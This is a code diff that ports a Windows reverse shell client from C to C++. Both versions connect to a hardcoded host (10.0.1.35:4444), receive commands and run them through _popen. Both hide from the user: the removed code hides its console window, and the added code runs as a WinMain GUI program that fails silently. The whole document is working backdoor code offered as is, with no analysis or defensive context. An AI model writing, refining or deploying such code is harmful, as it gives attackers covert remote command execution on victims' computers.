@@ -1,109 +1,68 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include <iostream>
+#include <string>
 #include <winsock2.h>
 #include <windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define MAX_COMMAND_LENGTH 1024
+using namespace std;
 
-// Hardcoded LHOST (IP) and LPORT (port)
-#define LHOST "10.0.1.35"
-#define LPORT 4444
-
-// Function to initialize Winsock
-void init_winsock() {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        exit(1);
-    }
-}
-
-// Function to clean up Winsock
-void cleanup_winsock() {
-    WSACleanup();
-}
-
-// Function to execute commands and return output
-void execute_command(SOCKET client_socket, const char* command) {
-    char buffer[MAX_COMMAND_LENGTH];
-    FILE* fp;
-
-    // Open the process for the command execution
-    fp = _popen(command, "r");
+// Function to execute the command and capture its output
+void executeCommand(const string& command) {
+    char buffer[128];
+    FILE* fp = _popen(command.c_str(), "r");
     if (fp == NULL) {
-        strcpy(buffer, "Failed to execute command");
-        send(client_socket, buffer, strlen(buffer), 0);
-        return;
+        return; // If execution fails, return without showing an error in the GUI
     }
-
-    // Read the command output and send it back to the server
-    while (fgets(buffer, MAX_COMMAND_LENGTH, fp) != NULL) {
-        send(client_socket, buffer, strlen(buffer), 0);
+    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        // Send the output back to the server, can be expanded to send results back
     }
-
-    // Close the file pointer after command execution
-    fclose(fp);
+    _pclose(fp);
 }
 
-// Function to handle the reverse shell connection
-void reverse_shell() {
-    SOCKET client_socket;
-    struct sockaddr_in server_addr;
-    char buffer[MAX_COMMAND_LENGTH];
-    int bytes_received;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    WSADATA wsa;
+    SOCKET s;
+    struct sockaddr_in server;
+    char server_reply[2000];
+
+    // Initialize WinSock
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        return 1; // If failed to initialize Winsock, exit without showing any error
+    }
 
     // Create socket
-    client_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (client_socket == INVALID_SOCKET) {
-        exit(1);
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s == INVALID_SOCKET) {
+        return 1; // If socket creation fails, exit silently
     }
 
-    // Prepare server address
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(LPORT);
-    server_addr.sin_addr.s_addr = inet_addr(LHOST);
+    // Define the server address (change this to the server's IP and port)
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);  // Use the same LPORT as in Go server
+    server.sin_addr.s_addr = inet_addr("10.0.1.35");  // Use the LHOST from Go server
 
     // Connect to the server
-    if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        exit(1);
+    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        return 1; // If connection fails, exit silently
     }
 
-    // Once connected, wait for commands from the server
-    while (1) {
-        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH, 0);
-        if (bytes_received <= 0) {
-            break; // Connection lost or server closed connection
+    // Receive and execute commands from the server
+    while (true) {
+        int recv_size = recv(s, server_reply, sizeof(server_reply) - 1, 0);
+        if (recv_size == SOCKET_ERROR) {
+            break; // If receiving data fails, break the loop and exit
         }
+        server_reply[recv_size] = '\0';
 
-        buffer[bytes_received] = '\0'; // Null-terminate the command
+        string command(server_reply);
+        command = command.substr(0, command.find("\n"));  // Clean up input command
 
-        // If the received command is "exit", break the loop
-        if (strncmp(buffer, "exit", 4) == 0) {
-            break;
-        }
-
-        // Execute the received command and send the result back
-        execute_command(client_socket, buffer);
+        // Execute the command
+        executeCommand(command);
     }
 
-    // Close the socket when done
-    closesocket(client_socket);
-}
-
-int main() {
-    // Hide the console window
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    // Initialize Winsock
-    init_winsock();
-
-    // Start the reverse shell
-    reverse_shell();
-
-    // Clean up Winsock
-    cleanup_winsock();
-
+    closesocket(s);
+    WSACleanup();
     return 0;
 }
